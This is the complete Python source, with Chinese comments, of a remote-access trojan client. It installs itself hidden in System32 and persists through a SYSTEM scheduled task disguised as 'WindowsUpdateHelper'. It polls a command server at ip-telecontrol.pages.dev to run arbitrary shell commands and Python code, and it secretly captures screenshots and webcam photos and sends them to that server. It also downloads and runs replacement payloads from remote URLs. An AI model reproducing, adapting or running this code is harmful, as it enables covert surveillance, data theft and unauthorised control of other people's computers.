import requests
import time
import json
import subprocess
import sys
import socket
import threading
import os
import base64
import io
import shutil
import tempfile
import hashlib
import random
import contextlib
from datetime import datetime

# 可选依赖库
try:
    import pyautogui
    from PIL import Image
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

try:
    import cv2
    CAMERA_AVAILABLE = True
except ImportError:
    CAMERA_AVAILABLE = False

# ========== 默认配置（会被 ipscfg.json 覆盖）==========
BASE_URL = "https://ip-telecontrol.pages.dev/"
CLIENT_ID = socket.gethostname() + "[" + socket.gethostbyname(socket.gethostname()) + "]"
POLL_INTERVAL = 5
HEARTBEAT_INTERVAL = 30
REQUEST_TIMEOUT = 10
# ===================================================

CONFIG_FILE = "ipscfg.json"
SYSTEM32_PATH = r"C:\Windows\System32"
TASK_NAME = "WindowsUpdateHelper"  # 计划任务名称（伪装）

exit_flag = threading.Event()


def log(msg, level="INFO"):
    t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    thread = threading.current_thread().name
    print(f"[{t}] [{thread}] [{level}] {msg}")


# ---------- 获取当前可执行文件路径（兼容 .py 和 .exe）----------
def get_current_executable():
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.abspath(__file__)


def get_current_filename():
    return os.path.basename(get_current_executable())


# ---------- 配置文件读写 ----------
def load_config():
    global BASE_URL, CLIENT_ID, POLL_INTERVAL, HEARTBEAT_INTERVAL, REQUEST_TIMEOUT
    config = {}
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
            log("已加载配置文件")
        except Exception as e:
            log(f"读取配置文件失败: {e}", "ERROR")
    else:
        config = {
            "BASE_URL": BASE_URL,
            "CLIENT_ID": CLIENT_ID,
            "POLL_INTERVAL": POLL_INTERVAL,
            "HEARTBEAT_INTERVAL": HEARTBEAT_INTERVAL,
            "REQUEST_TIMEOUT": REQUEST_TIMEOUT
        }
        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4)
            if os.name == 'nt':
                subprocess.run(f'attrib +h "{CONFIG_FILE}"', shell=True)
            log("已创建默认配置文件并隐藏")
        except Exception as e:
            log(f"创建配置文件失败: {e}", "ERROR")

    BASE_URL = config.get("BASE_URL", BASE_URL)
    CLIENT_ID = config.get("CLIENT_ID", CLIENT_ID)
    POLL_INTERVAL = config.get("POLL_INTERVAL", POLL_INTERVAL)
    HEARTBEAT_INTERVAL = config.get("HEARTBEAT_INTERVAL", HEARTBEAT_INTERVAL)
    REQUEST_TIMEOUT = config.get("REQUEST_TIMEOUT", REQUEST_TIMEOUT)


def save_config():
    config = {
        "BASE_URL": BASE_URL,
        "CLIENT_ID": CLIENT_ID,
        "POLL_INTERVAL": POLL_INTERVAL,
        "HEARTBEAT_INTERVAL": HEARTBEAT_INTERVAL,
        "REQUEST_TIMEOUT": REQUEST_TIMEOUT
    }
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
        if os.name == 'nt':
            subprocess.run(f'attrib +h "{CONFIG_FILE}"', shell=True)
        log("配置已保存")
    except Exception as e:
        log(f"保存配置失败: {e}", "ERROR")


# ---------- 自安装到 System32 并创建计划任务 ----------
def install_to_system32():
    if os.name != 'nt':
        log("非Windows系统，跳过自安装", "WARN")
        return

    try:
        src = get_current_executable()
        dst_name = get_current_filename()
        dst = os.path.join(SYSTEM32_PATH, dst_name)

        need_copy = True
        if os.path.exists(dst):
            if os.path.getsize(src) == os.path.getsize(dst):
                need_copy = False

        if need_copy:
            shutil.copy2(src, dst)
            log(f"已复制自身到 {dst}")
            subprocess.run(f'attrib +h +r +s "{dst}"', shell=True)
            log("已设置文件属性为隐藏、只读、系统")
        else:
            log("System32 中已存在相同文件，跳过复制")

        # 创建计划任务（所有用户登录时启动）
        if dst_name.lower().endswith('.exe'):
            command = f'"{dst}"'
        else:
            pythonw_path = sys.executable.replace('python.exe', 'pythonw.exe')
            if not os.path.exists(pythonw_path):
                pythonw_path = sys.executable
            command = f'"{pythonw_path}" "{dst}"'

        task_cmd = (
            f'schtasks /create /tn "{TASK_NAME}" /tr "{command}" '
            f'/sc onlogon /ru SYSTEM /f'
        )
        result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            log("计划任务创建成功")
        else:
            update_cmd = f'schtasks /change /tn "{TASK_NAME}" /tr "{command}"'
            subprocess.run(update_cmd, shell=True)
            log("计划任务已更新")
    except Exception as e:
        log(f"自安装过程出错: {e}", "ERROR")


# ---------- 心跳注册 ----------
def signup():
    url = BASE_URL + "/signupdrugs"
    payload = {
        "id": CLIENT_ID,
        "time": time.strftime("%y.%m.%d_%H.%M.%S")
    }
    try:
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        if data.get("success"):
            log("心跳注册成功")
        else:
            log(f"心跳注册失败: {data}", "WARN")
    except Exception as e:
        log(f"心跳请求异常: {e}", "ERROR")


# ---------- 命令轮询 ----------
def poll_command():
    url = BASE_URL + "/heartpumb"
    payload = {"id": CLIENT_ID}
    try:
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        log(f"轮询命令异常: {e}", "ERROR")
        return None


# ---------- 系统命令执行 ----------
def sys_command(cmd_str):
    log(f"执行命令: {cmd_str}")
    try:
        result = subprocess.run(
            cmd_str,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        head = f"'{CLIENT_ID}' successfully run command with return value {result.returncode}"
        body = result.stdout + result.stderr
        if not body:
            body = "(无输出)"
        return head, body
    except subprocess.TimeoutExpired:
        log("命令执行超时", "WARN")
        return f"'{CLIENT_ID}' running command overtime", "命令执行超过30秒"
    except Exception as e:
        log(f"执行命令异常: {e}", "ERROR")
        return f"'{CLIENT_ID}' failed in running command", str(e)


# ---------- 截图处理（压缩为JPEG）----------
def screenshot_command(resolution_str):
    if not SCREENSHOT_AVAILABLE:
        return f"'{CLIENT_ID}' screenshot failed", "缺少依赖库: pyautogui 或 PIL"

    try:
        width, height = map(int, resolution_str.split(','))
        log(f"开始截图，目标分辨率: {width}x{height}")

        screenshot = pyautogui.screenshot()
        resized = screenshot.resize((width, height), Image.Resampling.LANCZOS)

        img_bytes = io.BytesIO()
        resized.save(img_bytes, format='JPEG', quality=70, optimize=True)
        img_base64 = base64.b64encode(img_bytes.getvalue()).decode('utf-8')

        data_uri = f"data:image/jpeg;base64,{img_base64}"
        head = f"'{CLIENT_ID}' screenshot taken successfully"
        return head, data_uri
    except Exception as e:
        log(f"截图失败: {e}", "ERROR")
        return f"'{CLIENT_ID}' screenshot error", str(e)


# ---------- 摄像头拍照（压缩为JPEG）----------
def camera_command(params):
    if not CAMERA_AVAILABLE:
        return f"'{CLIENT_ID}' camera failed", "缺少依赖库: opencv-python"

    try:
        parts = params.split()
        if len(parts) != 2:
            return f"'{CLIENT_ID}' camera syntax error", "格式: $CAMSHOOT:摄像头索引 宽度,高度"
        cam_index = int(parts[0])
        width, height = map(int, parts[1].split(','))

        log(f"打开摄像头 {cam_index}，拍照分辨率: {width}x{height}")

        cap = cv2.VideoCapture(cam_index)
        if not cap.isOpened():
            return f"'{CLIENT_ID}' camera error", f"无法打开摄像头 {cam_index}"

        ret, frame = cap.read()
        cap.release()
        if not ret:
            return f"'{CLIENT_ID}' camera error", "读取图像失败"

        resized = cv2.resize(frame, (width, height))
        resized_rgb = cv2.cvtColor(resized, cv2.COLOR_BGR2RGB)
        img_pil = Image.fromarray(resized_rgb)

        img_bytes = io.BytesIO()
        img_pil.save(img_bytes, format='JPEG', quality=70, optimize=True)
        img_base64 = base64.b64encode(img_bytes.getvalue()).decode('utf-8')

        data_uri = f"data:image/jpeg;base64,{img_base64}"
        head = f"'{CLIENT_ID}' camera capture successful"
        return head, data_uri
    except Exception as e:
        log(f"拍照失败: {e}", "ERROR")
        return f"'{CLIENT_ID}' camera error", str(e)


# ---------- Python 代码执行（在线程内执行，捕获输出）----------
def pyshell_command(code_str):
    """
    在独立线程中执行 Python 代码，捕获 stdout/stderr，超时控制。
    返回 (head, output)
    """
    output_buffer = io.StringIO()
    exception_holder = [None]
    result_holder = [None]

    def target():
        try:
            # 重定向输出
            with contextlib.redirect_stdout(output_buffer), contextlib.redirect_stderr(output_buffer):
                exec(code_str, {'__name__': '__pyshell__'}, {})
        except Exception as e:
            exception_holder[0] = e

    thread = threading.Thread(target=target)
    thread.daemon = True
    thread.start()
    thread.join(timeout=30)  # 等待最多30秒

    if thread.is_alive():
        # 超时，无法强制终止线程（Python 线程无法强制杀死），但我们可以返回超时信息
        # 注意：线程可能仍在后台运行，但主程序继续。这不算完美，但至少不会阻塞。
        return f"'{CLIENT_ID}' python execution timeout", "代码执行超过30秒（线程仍在后台运行）"

    if exception_holder[0] is not None:
        return f"'{CLIENT_ID}' python execution error", str(exception_holder[0])

    output = output_buffer.getvalue()
    if not output:
        output = "(无输出)"
    return f"'{CLIENT_ID}' python code executed successfully", output


# ---------- 自我更新（下载到随机文件，修改计划任务）----------
def update_command(url):
    """
    从 URL 下载新版本到随机文件名（例如 System32 下随机哈希.exe），
    然后修改计划任务指向新文件，退出当前进程。
    """
    try:
        log(f"开始更新，下载地址: {url}")

        # 生成随机文件名（基于哈希）
        random_str = hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest()[:16]
        ext = os.path.splitext(get_current_filename())[1] or ('.exe' if getattr(sys, 'frozen', False) else '.py')
        new_filename = random_str + ext

        # 目标路径：如果当前在 System32 下，就放 System32；否则放当前目录
        if os.name == 'nt' and SYSTEM32_PATH in get_current_executable():
            target_dir = SYSTEM32_PATH
        else:
            target_dir = os.path.dirname(get_current_executable())

        new_path = os.path.join(target_dir, new_filename)

        # 下载到临时文件再移动，避免不完整
        with tempfile.NamedTemporaryFile(delete=False, suffix='.tmp') as tmp:
            tmp_path = tmp.name

        resp = requests.get(url, stream=True, timeout=30)
        resp.raise_for_status()
        with open(tmp_path, 'wb') as f:
            for chunk in resp.iter_content(chunk_size=8192):
                f.write(chunk)

        # 移动临时文件到目标路径
        shutil.move(tmp_path, new_path)
        log(f"新文件已保存: {new_path}")

        # 设置隐藏/只读/系统属性（如果是在 System32 下）
        if os.name == 'nt' and target_dir == SYSTEM32_PATH:
            subprocess.run(f'attrib +h +r +s "{new_path}"', shell=True)

        # 修改计划任务指向新文件
        if os.name == 'nt':
            if new_path.lower().endswith('.exe'):
                command = f'"{new_path}"'
            else:
                pythonw_path = sys.executable.replace('python.exe', 'pythonw.exe')
                if not os.path.exists(pythonw_path):
                    pythonw_path = sys.executable
                command = f'"{pythonw_path}" "{new_path}"'

            # 更新计划任务
            update_cmd = f'schtasks /change /tn "{TASK_NAME}" /tr "{command}"'
            subprocess.run(update_cmd, shell=True, check=False)
            log("计划任务已指向新文件")

        # 启动新进程（可选，但为了立即生效，可以启动）
        if new_path.lower().endswith('.exe'):
            subprocess.Popen([new_path])
        else:
            pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            subprocess.Popen([pythonw, new_path])

        # 退出当前进程
        log("更新完成，旧进程退出")
        os._exit(0)
    except Exception as e:
        log(f"更新过程异常: {e}", "ERROR")
        return f"'{CLIENT_ID}' update error", str(e)


# ---------- 命令分发 ----------
def execute_command(cmd_str):
    log(f"处理命令: {cmd_str}")
    cmds = cmd_str.split(":", 1)
    signal = cmds[0]
    if len(cmds) > 1:
        param = cmds[1]
    else:
        param = ""

    try:
        if signal == "$CMD":
            return sys_command(param)
        elif signal == "$HBTIME":
            global POLL_INTERVAL
            try:
                new_interval = int(param)
                POLL_INTERVAL = new_interval
                save_config()
                return f"'{CLIENT_ID}' changed heartbeat time", str(new_interval)
            except ValueError:
                return f"'{CLIENT_ID}' invalid heartbeat time", param
        elif signal == "$SCRSHOOT":
            return screenshot_command(param)
        elif signal == "$CAMSHOOT":
            return camera_command(param)
        elif signal == "$RENAME":
            global CLIENT_ID
            new_id = param.strip()
            if new_id:
                CLIENT_ID = new_id
                save_config()
                return f"'{CLIENT_ID}' renamed successfully", new_id
            else:
                return f"'{CLIENT_ID}' rename failed", "empty id"
        elif signal == "$SIGNUP":
            signup()
            return f"'{CLIENT_ID}' signup triggered", ""
        elif signal == "$UPDATE":
            return update_command(param)
        elif signal == "$PYSHELL":
            return pyshell_command(param)
        else:
            return f"'{CLIENT_ID}' received illegal command", signal
    except Exception as e:
        log(f"execute_command 未处理异常: {e}", "ERROR")
        return f"'{CLIENT_ID}' internal error", str(e)


# ---------- 提交结果 ----------
def submit_response(cmd_head, cmd_body):
    url = BASE_URL + "/response"
    payload = {
        "id": CLIENT_ID,
        "head": cmd_head,
        "body": cmd_body
    }
    try:
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        if data.get("success"):
            log("结果提交成功")
        else:
            log(f"结果提交失败: {data}", "WARN")
    except Exception as e:
        log(f"提交结果异常: {e}", "ERROR")


# ---------- 心跳线程 ----------
def heartbeat_loop():
    log("心跳线程启动")
    while not exit_flag.is_set():
        signup()
        for _ in range(HEARTBEAT_INTERVAL):
            if exit_flag.wait(1):
                break
    log("心跳线程结束")


# ---------- 轮询线程 ----------
def polling_loop():
    log("轮询线程启动")
    while not exit_flag.is_set():
        try:
            resp_data = poll_command()
            if resp_data and resp_data.get("success"):
                is_me = resp_data.get("isme", False)
                cmd = resp_data.get("cmd", "")
                log(f"轮询返回: isme={is_me}, cmd={cmd}")

                if is_me:
                    head, body = execute_command(cmd)
                    if head is not None:
                        submit_response(head, body)
            else:
                log("轮询无效响应，稍后重试", "WARN")
        except Exception as e:
            log(f"轮询循环未处理异常: {e}", "ERROR")

        for _ in range(POLL_INTERVAL):
            if exit_flag.wait(1):
                break
    log("轮询线程结束")


# ---------- 主函数 ----------
def main():
    load_config()

    # 尝试自安装（仅在 Windows 且非 System32 路径下执行一次）
    current_path = get_current_executable()
    if os.name == 'nt' and SYSTEM32_PATH not in current_path:
        install_to_system32()

    log(f"接收端启动，CLIENT_ID = {CLIENT_ID}")
    log(f"心跳间隔: {HEARTBEAT_INTERVAL}s, 轮询间隔: {POLL_INTERVAL}s")

    t_heart = threading.Thread(target=heartbeat_loop, name="Heartbeat")
    t_poll = threading.Thread(target=polling_loop, name="Polling")
    t_heart.daemon = True
    t_poll.daemon = True
    t_heart.start()
    t_poll.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("收到中断信号，正在停止线程...")
        exit_flag.set()
        t_heart.join(timeout=2)
        t_poll.join(timeout=2)
        log("接收端已停止")
        sys.exit(0)


if __name__ == "__main__":
    main()
